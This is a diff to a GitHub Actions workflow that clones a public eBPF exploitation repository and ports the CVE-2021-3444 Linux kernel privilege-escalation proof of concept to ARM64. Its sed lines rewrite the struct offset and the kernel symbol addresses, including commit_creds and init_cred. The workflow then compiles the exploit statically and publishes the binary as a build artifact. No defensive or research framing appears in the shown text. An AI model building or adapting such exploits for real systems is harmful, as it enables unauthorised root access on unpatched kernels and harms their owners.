@@ -1,4 +1,4 @@
-name: build_botti_poc_original
+name: botti_poc_arm64_offset
 on: [push, workflow_dispatch]
 
 jobs:
@@ -12,24 +12,32 @@ jobs:
           sudo apt-get update -y
           sudo apt-get install -y gcc make git
 
-      - name: Clone Botti01 repo
+      - name: Clone and patch PoC
         run: |
           git clone https://github.com/Botti01/eBPF-CVE-exploitation.git
+          cd eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc
+          
+          # Patch OPS_OFFSET for ARM64 (struct is 320 bytes + value 256 bytes = 576)
+          sed -i 's|#define OPS_OFFSET 304|#define OPS_OFFSET 576|' exploit.c
+          
+          # Also patch the ARM64 symbol addresses
+          sed -i 's|#define KERNEL_BASE 0xffffffff81000000ULL|#define KERNEL_BASE 0xffffff8008080000ULL|' exploit.c
+          sed -i 's|#define ARRAY_MAP_OPS 0xffffffff81a1c8c0ULL|#define ARRAY_MAP_OPS 0xffffff8008f5d500ULL|' exploit.c
+          sed -i 's|#define ARRAY_OF_MAPS_MAP_OPS 0xffffffff81a1c640ULL|#define ARRAY_OF_MAPS_MAP_OPS 0xffffff8008f5d780ULL|' exploit.c
+          sed -i 's|#define FD_ARRAY_MAP_DELETE_ELEM 0xffffffff810e32d0ULL|#define FD_ARRAY_MAP_DELETE_ELEM 0xffffff80081d6cecULL|' exploit.c
+          sed -i 's|#define COMMIT_CREDS 0xffffffff81072470ULL|#define COMMIT_CREDS 0xffffff80080e03dcULL|' exploit.c
+          sed -i 's|#define INIT_CRED 0xffffffff81e355e0ULL|#define INIT_CRED 0xffffff8009787f48ULL|' exploit.c
+          
+          echo "=== After patch ==="
+          grep -E "OPS_OFFSET|KERNEL_BASE|ARRAY_MAP_OPS|COMMIT_CREDS|INIT_CRED" exploit.c
 
-      - name: Show offsets used by PoC
+      - name: Compile
         run: |
           cd eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc
-          echo "=== Original offsets (x86_64) ==="
-          grep -E "BPF_ARRAY_VALUE_OFFSET|MAP_VALUE_SIZE|OPS_OFFSET|KERNEL_BASE|ARRAY_MAP_OPS|COMMIT_CREDS|INIT_CRED" exploit.c
-
-      - name: Compile PoC
-        run: |
-          cd eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc
-          gcc -static -O2 -I ../../../common/include exploit.c -o exploit_botti
-          file exploit_botti
-          ls -la exploit_botti
+          gcc -static -O2 -I ../../../common/include exploit.c -o exploit_arm64
+          ls -la exploit_arm64
 
       - uses: actions/upload-artifact@v4
         with:
-          name: botti-poc-original
-          path: eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc/exploit_botti
+          name: botti-poc-arm64
+          path: eBPF-CVE-exploitation/CVEs/CVE-2021-3444/poc/exploit_arm64
